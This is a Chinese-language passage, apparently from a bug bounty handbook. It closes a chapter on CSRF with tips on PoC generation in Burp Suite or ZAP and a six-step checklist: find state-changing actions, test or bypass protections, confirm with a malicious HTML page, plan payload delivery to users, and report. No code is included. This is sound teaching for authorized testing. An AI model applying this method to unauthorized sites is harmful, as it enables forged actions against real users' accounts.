
使用这些交付方法，你可以向公司展示攻击者如何实际攻击大量用户，并展示 CSRF 漏洞的最大影响。如果你有 Burp Suite Pro 或使用 ZAP 代理，还可以利用其 CSRF POC 生成功能。更多信息请搜索工具文档中的 CSRF POC 生成。你也可以保留自己编写的 POC 脚本，每次测试新目标时将目标站点的 URL 插入脚本中。

## 找到你的第一个 CSRF！

掌握了 CSRF 漏洞、绕过 CSRF 保护和提升 CSRF 影响的知识后，你现在可以开始寻找第一个 CSRF 漏洞了！选择一个漏洞赏金计划，按照本章的步骤找到你的第一个 CSRF：

1. **识别应用程序上的状态更改操作**，并记录其位置和功能。
2. **检查这些功能是否存在 CSRF 保护**。如果找不到任何保护，你可能发现了漏洞！
3. **如果存在 CSRF 保护机制**，尝试使用本章提到的绕过技术绕过保护。
4. **通过构造恶意 HTML 页面并访问该页面**，确认漏洞是否已执行操作。
5. **思考将载荷交付给最终用户的策略**。
6. **起草你的第一份 CSRF 报告！**
